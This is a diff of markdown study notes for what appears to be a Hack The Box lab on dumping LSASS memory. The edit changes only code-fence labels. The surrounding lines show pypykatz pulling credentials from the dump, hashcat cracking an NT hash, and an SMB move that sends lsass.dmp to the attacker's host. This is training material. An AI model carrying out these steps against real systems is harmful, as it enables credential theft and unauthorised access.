@@ -73,7 +73,7 @@ Once we have the dump file on our attack host, we can use a powerful tool called
 
 The command initiates the use of `pypykatz` to parse the secrets hidden in the LSASS process memory dump. We use `lsa` in the command because LSASS is a subsystem of the `Local Security Authority`, then we specify the data source as a `minidump` file, proceeded by the path to the dump file stored on our attack host. Pypykatz parses the dump file and outputs the findings:
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
 
 INFO:root:Parsing file /home/peter/Documents/lsass.dmp
@@ -166,7 +166,7 @@ luid 1343859
 
 ### MSV
 
-```sh
+```shellsession
 sid S-1-5-21-4019466498-1700476312-3544718034-1001
 luid 1354633
 	== MSV ==
@@ -182,7 +182,7 @@ luid 1354633
 
 ### WDIGEST
 
-```sh
+```shellsession
 	== WDIGEST [14ab89]==
 		username bob
 		domainname DESKTOP-33E7O54
@@ -195,7 +195,7 @@ luid 1354633
 
 ### Kerberos
 
-```sh
+```shellsession
 	== Kerberos ==
 		Username: bob
 		Domain: DESKTOP-33E7O54
@@ -205,7 +205,7 @@ luid 1354633
 
 ### DPAPI
 
-```sh
+```shellsession
     == DPAPI [14ab89]==
 		luid 1354633
 		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
@@ -218,7 +218,7 @@ Mimikatz and Pypykatz can extract the DPAPI `masterkey` for logged-on users whos
 ## Cracking the NT Hash with Hashcat
 We can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 <SNIP>
 64f12cddaa88057e06a81b54e73b949b:Password1
@@ -243,7 +243,7 @@ RDP to **10.129.202.149** (ACADEMY-PWATTACKS-LSASS) with user `htb-student` and 
    - `$ smbserver.py -smb2support DATA /home/htb-ac-1863259/Desktop/` → At the attack host, start the SMB server to receive the `lsass.dmp` 
    - `PS C:\> move lsass.dmp \\10.10.14.225\DATA` → Transfer the dump file to the attack host for offline cracking
    - Use pypycatz to extract credentials from the dump file and crack it using hashcat:
-        ```sh
+        ```shellsession
         $ pypykatz lsa minidump lsass.dmp
         <SNIP>
         == LogonSession ==
